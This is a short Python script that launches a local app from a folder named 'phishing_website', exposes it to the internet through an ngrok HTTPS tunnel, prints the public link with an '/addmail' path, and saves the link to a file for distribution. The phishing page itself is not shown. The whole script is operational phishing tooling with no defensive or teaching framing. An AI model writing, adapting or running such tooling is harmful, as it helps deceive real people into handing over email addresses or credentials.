from pyngrok import ngrok
import subprocess
import os
class Server:
    def __init__(self):
        self.cmd_line = "python3 ./phishing_website/app.py"
        self.phishing_link = ""
    def run(self):
        subprocess.Popen(self.cmd_line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        https_tunnel = ngrok.connect(5000, bind_tls=True)
        self.phishing_link = https_tunnel.public_url
        print(self.phishing_link+'/addmail')
        with open('./link.txt','r+') as myfile:
            myfile.write(self.phishing_link)
            myfile.truncate()
        
if __name__ == "__main__":
    my_server = Server()
    my_server.run()
   # os.system('python3 ./phishing_website/app.py')
    while(1):
        pass

